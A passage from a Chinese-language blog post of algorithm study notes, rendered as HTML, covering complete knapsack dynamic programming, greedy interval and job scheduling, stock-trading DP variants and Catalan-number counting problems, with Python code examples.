class="hljs-built_in">sum</span>]<br></code></pre></td></tr></table></figure><blockquote><p>如上题，<code>j</code>应从后往前反向遍历，因为每个物品（或者说数字）只能用一次，以免之前的结果影响了其他的结果。</p></blockquote><p>至此，子集切割的问题就完全解决了，时间复杂度 O(n*sum)，空间复杂度 O(sum)。 </p><h6 id="完全背包问题"><a href="#完全背包问题" class="headerlink" title="完全背包问题"></a>完全背包问题</h6><p>例：<a href="https://leetcode-cn.com/problems/coin-change-2/">https://leetcode-cn.com/problems/coin-change-2/</a></p><p>零钱兑换2：给定不同面额的硬币和一个总金额，写出函数来计算可以凑成总金额的硬币组合数，假设每一种面额的硬币有无限个<strong>。</strong></p><p><strong>问题转换：</strong></p><p>有一个背包，最大容量为<code>W</code>，有一系列物品<code>weight</code>，每个物品的重量为<code>weight[i]</code>，每个物品的数量无限，请问有多少种方法，能够把背包恰好装满。</p><p>1、明确【状态】和【选择】：</p><p>状态：【背包的容量】、【可选择的物品】</p><p>选择：【装进背包】、【不装进背包】</p><p>2、明确<code>dp</code>数组的定义：</p><p>若只使用前<code>i</code>个物品，当背包容量为<code>j</code>时，有<code>dp[i][j]</code>种方法可以装满背包。</p><p>所求的答案即为<code>dp[N][W]</code>，<code>N</code>为<code>weight</code>数组的大小。</p><p>base case：<code>dp[0][...]=0</code>和<code>dp[...][0]=1</code></p><p>3、根据【选择】，思考状态转移的逻辑：</p><p>条件：<code>j &gt;= weight[i-1]</code></p><p>装入背包：<code>dp[i][j-weight[i-1]]</code>&#x3D;&#x3D;(可以重复，所以是<code>i</code>而不是<code>i-1</code>)&#x3D;&#x3D;</p><p>不装入背包：<code>dp[i-1][j]</code></p><p>共有<code>dp[i][j] = dp[i][j-weight[i-1]] + dp[i-1][j]</code>种凑法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 完全背包</span><br><span class="hljs-comment"># weight: 物品重量数组</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">knapsack_complete</span>(<span class="hljs-params">W,weight</span>):<br>    dp = np.zeros((<span class="hljs-built_in">len</span>(weight)+<span class="hljs-number">1</span>,W+<span class="hljs-number">1</span>),dtype=<span class="hljs-built_in">int</span>)<br>    <span class="hljs-comment"># base case</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(weight)+<span class="hljs-number">1</span>):<br>        dp[i][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(weight)+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,W+<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> j &gt;= weight[i-<span class="hljs-number">1</span>]:<br>                dp[i][j] = dp[i-<span class="hljs-number">1</span>][j] + dp[i][j - weight[i-<span class="hljs-number">1</span>]]<br>            <span class="hljs-keyword">else</span>:<br>                dp[i][j] = dp[i-<span class="hljs-number">1</span>][j]<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-built_in">len</span>(weight)][W]<br></code></pre></td></tr></table></figure><p>4、优化：降低空间复杂度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 状态压缩</span><br><span class="hljs-comment"># W: 背包承重 weight: 物品重量数组</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">knapsack_complete2</span>(<span class="hljs-params">W,weight</span>):<br>    dp = [<span class="hljs-number">0</span>]*(W+<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># base case</span><br>    dp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(weight)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, W+<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> j &gt;= weight[i]:<br>                dp[j] = dp[j] + dp[j-weight[i]]<br>    <span class="hljs-keyword">return</span> dp<br></code></pre></td></tr></table></figure><p>时间复杂度<code> O(len(weight)*W)</code>，空间复杂度<code>O(W)</code>。</p><h4 id="贪婪算法"><a href="#贪婪算法" class="headerlink" title="贪婪算法"></a>贪婪算法</h4><ul><li>通过做出一系列短视的决策来解决问题</li><li>每个决策本身都能最优地解决某些子问题</li><li>但这些子问题对整个问题来说未必最优</li><li>设计的关键：找到一种合适的方法，把问题分解成几个小的部分，然后把他们组合在一起</li><li>例：作业调度、Dijkstra算法、最小生成树</li></ul><blockquote><p>每一步都做出一个局部最优的选择，最终的结果就是全局最优。</p><p>注：部分问题具有这个性质</p></blockquote><h5 id="区间调度问题"><a href="#区间调度问题" class="headerlink" title="区间调度问题"></a>区间调度问题</h5><p>给出多个形如[start,end]的闭区间，算出这些区间中最多有几个互不相交的区间。</p><blockquote><p>例：intvs &#x3D; [[1,3],[2,4],[3,6]]，应返回2，即最多有两个区间互不相交</p></blockquote><p>解题思路：</p><p>1、从区间结合intvs中选择一个区间x，这个x是在当前所有区间中结束最早的（end最小）</p><p>2、把所有与x相交的区间从区间集合intvs中删除</p><p>3、重复步骤1和步骤2，直到intvs为空，之前选出的x就是最大不相交子集。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 区间调度</span><br><span class="hljs-comment"># intvs: 区间集合</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_function</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> x[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">interval_schedule</span>(<span class="hljs-params">intvs</span>):<br>    <span class="hljs-keyword">if</span> intvs == []:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 按end排序</span><br>    intvs.sort(key=key_function)<br>    <span class="hljs-comment"># 至少有一个区间不相交</span><br>    count = <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 排序后，第一个区间就是x</span><br>    x_end = intvs[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> intv <span class="hljs-keyword">in</span> intvs:<br>        start = intv[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> start &gt;= x_end:<br>            count += <span class="hljs-number">1</span><br>            x_end = intv[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> count<br><br><span class="hljs-comment"># 测试</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    intvs = [[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">4</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">6</span>],[<span class="hljs-number">8</span>,<span class="hljs-number">9</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]]<br>    <span class="hljs-built_in">print</span>(interval_schedule(intvs))<br></code></pre></td></tr></table></figure><h5 id="作业调度"><a href="#作业调度" class="headerlink" title="作业调度"></a>作业调度</h5><p><strong>问题描述：</strong></p><p>给定：n个作业和一台机器，作业<code>i</code>有一个开始时间$s_i$和一个完成时间$f_i \geq s_i$</p><p>目标：以非重叠的方式找到可以在机器上调度的最大作业子集</p><p>对于任意两个计划作业<code>i</code>和<code>j</code>，$f_i \le s_j$ 或 $f_j \le s_i$ （不能同时进行）</p><p>贪婪方法：持续作业调度，确保没有新作业与现有的作业重叠。关键在于调度作业的顺序。</p><p><strong>贪婪策略：</strong></p><p>有几种可能的方法可以做到这一点，每种方法都试图尽量减少每个连续作业可能导致的潜在重叠次数</p><ul><li>最短作业优先</li><li>最早到达优先</li><li>冲突最少优先</li><li>最早完成时间优先</li></ul><p><strong>最早完成时间优先：</strong></p><p>考虑任何不少于<code>k</code>个作业的解决方案<code>S</code>。对<code>k</code>归纳证明，贪婪算法<code>G</code>调度至少<code>k</code>个作业时，前<code>k</code>个作业不晚于所选解中的前<code>k</code>个作业完成。这一结论意味着贪婪算法调度的作业数至少与最优解相同。</p><p>基本情况：<code>k=0</code>，假设归纳假设适用于<code>k-1</code></p><p>令$S_k$为<code>S</code>中的第<code>k</code>个作业，$G_k$是贪婪调度的第<code>k</code>个作业。显然，$s_{S_K} \ge f_{S_K-1} \ge f_{G_{K-1}}$。也就是说，$S_k$在$G_{k-1}$完成之后开始。另外，在贪婪中调度$G_{k-1}$时，$S_k$尚未被考虑。因此贪婪算法可以通过增加作业$S_k$来扩充其调度。因此，它会找到一个候选者来扩充它的解决方案，特别是选择一个不晚于$S_k$的解决方案。</p><p><strong>贪婪算法的特点：</strong>分步骤来构造一个优化问题的解，每一步需满足特定要求。</p><ul><li>可行：不违反约束条件</li><li>局部最优：当前步骤最优的局部解</li><li>不可撤销：一旦做出选择，后续步骤中无法改变（与动态规划的区别，动态规划考虑全局，可以撤销，贪婪考虑局部）</li></ul><h5 id="最佳股票交易时间"><a href="#最佳股票交易时间" class="headerlink" title="最佳股票交易时间"></a>最佳股票交易时间</h5><p>问题描述：整形数组中的元素表示当天股票的价格；根据需要买入卖出，完成尽可能多的交易；不得同时进行多笔交易，必须在再次购买之前卖出股票；设计算法找出最大利润。</p><p><strong>股票买卖问题：</strong></p><p>问题描述：给定一个数组，它的第<code>i</code>个元素时一支给定的股票在第<code>i</code>天的价格，设计一个算法来计算你能获取的最大利益。你最多可以完成<code>k</code>笔交易，且不能同时参与多笔交易。</p><p>示例：</p><blockquote><p>输入：[2,4,1], k&#x3D;2</p><p>输出：2（最大利益）</p><p>输入：[3,2,6,5,0,3], k&#x3D;2</p><p>输出：7（最大利益）</p></blockquote><p>1、明确【状态】和【选择】</p><p>状态：【天数】、【允许交易的最大次数】、【当前的持有状态】(1持有0没有持有)</p><p>选择：【买入】、【卖出】、【无操作】</p><p>尝试穷举：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">dp[i][k][<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>]<br><span class="hljs-number">0</span> &lt;= i &lt;= n-<span class="hljs-number">1</span>, <span class="hljs-number">1</span> &lt;= k &lt;= K<br><span class="hljs-comment"># n为天数，K为最多交易数</span><br><span class="hljs-comment"># 此问题共n*K*2种状态，可尝试穷举</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,K+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;:<br>            dp[i][k][s] = <span class="hljs-built_in">max</span>(buy,sell,rest)<br><span class="hljs-keyword">return</span> dp[n-<span class="hljs-number">1</span>][K][<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>2、状态转移框架</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># base case:</span><br><span class="hljs-comment"># i=-1(没开始) k=0(不允许交易) 利润为0</span><br>dp[-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>] = dp[i][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br><span class="hljs-comment"># i=-1 s=1(没开始时持有股票) k=0 s=1(不允许交易持有股票) 负无穷表不可能</span><br>dp[-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>] = dp[i][<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = -<span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;INF&#x27;</span>)<br><br><span class="hljs-comment"># 状态转移方程：</span><br>dp[i][k][<span class="hljs-number">0</span>] = <span class="hljs-built_in">max</span>(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>],dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>] + prices[i])<br>dp[i][k][<span class="hljs-number">1</span>] = <span class="hljs-built_in">max</span>(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>],dp[i-<span class="hljs-number">1</span>][k-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] - prices[i])<br></code></pre></td></tr></table></figure><p>3、运用到不同类型的题目</p><ul><li>k&#x3D;1</li></ul><p>此时<code>k</code>均为1，不会改变，<code>k</code>对于状态转移已经没有影响了，可以简化<code>k</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># k=1的情况</span><br><span class="hljs-comment"># prices: 股票价格列表</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profit2</span>(<span class="hljs-params">prices</span>):<br>    n = <span class="hljs-built_in">len</span>(prices)<br>    dp = np.zeros((n,<span class="hljs-number">2</span>),dtype=<span class="hljs-built_in">int</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-keyword">if</span> i-<span class="hljs-number">1</span>==-<span class="hljs-number">1</span>: <br>            dp[i][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span><br>            dp[i][<span class="hljs-number">1</span>]=-prices[i]<br>            <span class="hljs-keyword">continue</span><br>        dp[i][<span class="hljs-number">0</span>]=<span class="hljs-built_in">max</span>(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]+prices[i])<br>        dp[i][<span class="hljs-number">1</span>]=<span class="hljs-built_in">max</span>(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>],-prices[i])<br>    <span class="hljs-keyword">return</span> dp[n-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>优化：降低空间复杂度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 改进：dp数组-&gt;一个变量</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profit3</span>(<span class="hljs-params">prices</span>):<br>    n = <span class="hljs-built_in">len</span>(prices)<br>    <span class="hljs-comment"># base case</span><br>    dp0,dp1 = <span class="hljs-number">0</span>,-<span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;INF&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        dp0 = <span class="hljs-built_in">max</span>(dp0,dp1+prices[i])<br>        dp1 = <span class="hljs-built_in">max</span>(dp1,-prices[i])<br>    <span class="hljs-keyword">return</span> dp0<br></code></pre></td></tr></table></figure><ul><li>k&#x3D;正无穷</li></ul><p>此时<code>k=k-1</code>，依然不需要<code>k</code>来记录状态</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># k= 正无穷</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profit4</span>(<span class="hljs-params">prices</span>):<br>    n=<span class="hljs-built_in">len</span>(prices)<br>    dp0,dp1 = <span class="hljs-number">0</span>,-<span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;INF&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        tmp=dp0<br>        dp0=<span class="hljs-built_in">max</span>(dp0,dp1+prices[i])<br>        dp1=<span class="hljs-built_in">max</span>(dp1,tmp-prices[i])<br>    <span class="hljs-keyword">return</span> dp0<br></code></pre></td></tr></table></figure><ul><li>k&#x3D;正无穷+冷却一天</li></ul><p>每次sell后，要等一天才能交易</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># k=正无穷+cooldown</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profit5</span>(<span class="hljs-params">prices</span>):<br>    n=<span class="hljs-built_in">len</span>(prices)<br>    dp0,dp1 = <span class="hljs-number">0</span>,-<span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;INF&#x27;</span>)<br>    dp_pre0 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> price <span class="hljs-keyword">in</span> prices:<br>        tmp=dp0<br>        dp0 = <span class="hljs-built_in">max</span>(dp0,dp1+price)<br>        dp1 = <span class="hljs-built_in">max</span>(dp1,dp_pre0-price)<br>        dp_pre0=tmp<br>    <span class="hljs-keyword">return</span> dp0<br></code></pre></td></tr></table></figure><ul><li>k&#x3D;正无穷+fee</li></ul><p>把手续费从利润中减去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># k=正无穷+fee</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profit6</span>(<span class="hljs-params">prices,fee</span>):<br>    n=<span class="hljs-built_in">len</span>(prices)<br>    dp0,dp1=<span class="hljs-number">0</span>,-<span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;INF&#x27;</span>)<br>    <span class="hljs-keyword">for</span> price <span class="hljs-keyword">in</span> prices:<br>        tmp = dp0<br>        dp0 = <span class="hljs-built_in">max</span>(dp0,dp1+price)<br>        dp1 = <span class="hljs-built_in">max</span>(dp1,tmp-price-fee)<br>    <span class="hljs-keyword">return</span> dp0<br></code></pre></td></tr></table></figure><ul><li>k&#x3D;2</li></ul><p>没有消掉<code>k</code>的影响，所以必须对<code>k</code>进行穷举</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># k=2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profit7</span>(<span class="hljs-params">prices</span>):<br>    K=<span class="hljs-number">2</span><br>    n=<span class="hljs-built_in">len</span>(prices)<br>    <span class="hljs-comment"># 创建三维表</span><br>    dp = np.zeros((n,K+<span class="hljs-number">1</span>,<span class="hljs-number">2</span>),dtype=<span class="hljs-built_in">float</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(K,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> i-<span class="hljs-number">1</span>==-<span class="hljs-number">1</span>:<br>                dp[i][k][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br>                dp[i][k][<span class="hljs-number">1</span>] = -prices[i]<br>                <span class="hljs-keyword">continue</span><br>            dp[i][k][<span class="hljs-number">0</span>] = <span class="hljs-built_in">max</span>(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>],dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>]+prices[i])<br>            dp[i][k][<span class="hljs-number">1</span>] = <span class="hljs-built_in">max</span>(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>],dp[i-<span class="hljs-number">1</span>][k-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-prices[i])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(dp[n-<span class="hljs-number">1</span>][K][<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><ul><li>k&#x3D;any integer</li></ul><p>K非常大时，可使用k&#x3D;正无穷的解法，减少遍历。</p><p>此外可类似k&#x3D;2的写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># k=any integer</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profit8</span>(<span class="hljs-params">prices,K</span>):<br>    n=<span class="hljs-built_in">len</span>(prices)<br>    <span class="hljs-keyword">if</span> K &gt; n/<span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> profit4(prices)<br>    <span class="hljs-comment"># 创建三维表</span><br>    dp = np.zeros((n,K+<span class="hljs-number">1</span>,<span class="hljs-number">2</span>),dtype=<span class="hljs-built_in">float</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(K,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> i-<span class="hljs-number">1</span>==-<span class="hljs-number">1</span>:<br>                dp[i][k][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br>                dp[i][k][<span class="hljs-number">1</span>] = -prices[i]<br>                <span class="hljs-keyword">continue</span><br>            dp[i][k][<span class="hljs-number">0</span>] = <span class="hljs-built_in">max</span>(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>],dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>]+prices[i])<br>            dp[i][k][<span class="hljs-number">1</span>] = <span class="hljs-built_in">max</span>(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>],dp[i-<span class="hljs-number">1</span>][k-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-prices[i])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(dp[n-<span class="hljs-number">1</span>][K][<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><p>总结：用数组存储所有的状态，从base case开始状态转移，至解。</p><h5 id="圆和弦（卡特兰数）"><a href="#圆和弦（卡特兰数）" class="headerlink" title="圆和弦（卡特兰数）"></a>圆和弦（卡特兰数）</h5><p>问题描述：圆上有<code>2n</code>个点，可以连成<code>n</code>个不相交的弦，不同的连接方式有多少？</p><p>解题思路：</p><p>0、定义函数<code>f(2n)</code>：为所求答案</p><p>1、连接任意两个点，可以用一根弦将整个圆分成两部分，例如对于有<code>2n</code>个点的圆，可以分成<code>2</code>和<code>n-4</code>两部分，于是这个情况有<code>f(2)*f(n-4)</code>种连接方式。</p><p>2、因为划分要做到两边都是偶数，才能保证连接出<code>n</code>个弦不相交，所以从单个点出发，有<code>n/2</code>种划分。</p><p>3、最终答案就是把每种划分的所有连接方式相加。</p><p>实际是算卡特兰数，也即：<code>f(n)=f(0)*f(n-1)+f(1)*f(n-2)+...+f(n-1)*f(0)</code></p><p>例：<code>[1, 1, 2, 5, 14, 42, 132, 429, 1430, 4862, 16796] </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 圆和弦</span><br><span class="hljs-comment"># 圆上有2n个点，可以连成n个不相交的弦，不同的连接方式有多少？</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Catalan</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n%<span class="hljs-number">2</span> != <span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    dp = [<span class="hljs-number">0</span>]*<span class="hljs-built_in">int</span>(n/<span class="hljs-number">2</span>+<span class="hljs-number">1</span>)<br>    dp[<span class="hljs-number">0</span>]=dp[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-built_in">int</span>(n/<span class="hljs-number">2</span>)+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br>            dp[i] += dp[j]*dp[i-j-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-built_in">int</span>(n/<span class="hljs-number">2</span>)]<br></code></pre></td></tr></table></figure><blockquote><p>同样是求卡特兰数的问题：</p><ul><li>出栈问题：已知进展顺序<code>abcd</code>，可能的出栈顺序多少种？<code>f(4)=14</code>。</li><li>n个符号分别依次入栈</li><li>归结为已知问题：在n*n的方格中，入栈&#x3D;向上，出栈&#x3D;向右，起点（0,0），终点（n,n）</li><li>满二叉树问题：求个(n+1)个叶子的满二叉树的个数（这里的满二叉树（full binary tree）是指除根节点外的节点要么有2个要么有0个节点）。<code>f(3)=5</code>即4个叶子的满二叉树个数。</li><li>购票问题：电影票每50张元，如果有个人排队买票，其中个n人各持有100元面值的钞票张，另外个m人各持有50元面值的钞票张，而票房没有预备找零．有多少种方法可以将这个人排成一列，顺序购票？<code>m=n时，即为Catalan数</code>。</li><li>凸多边形的剖分：求凸（n+2）边形用其(n-1)条对角线分割为互不重叠的三角形的分法总数。<code>f(4)=14</code>凸6边形用3条对角线的分法总数。</li></ul></blockquote><h6 id="卡特兰计数问题"><a href="#卡特兰计数问题" class="headerlink" title="卡特兰计数问题"></a>卡特兰计数问题</h6><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/2022-04-21_133416.png" alt="2022-04-21_133416"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 动态规划的解法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Catalan4</span>(<span class="hljs-params">m,n</span>):<br>    dp = np.zeros((m+<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>), dtype=<span class="hljs-built_in">int</span>)<br>    dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>        <span 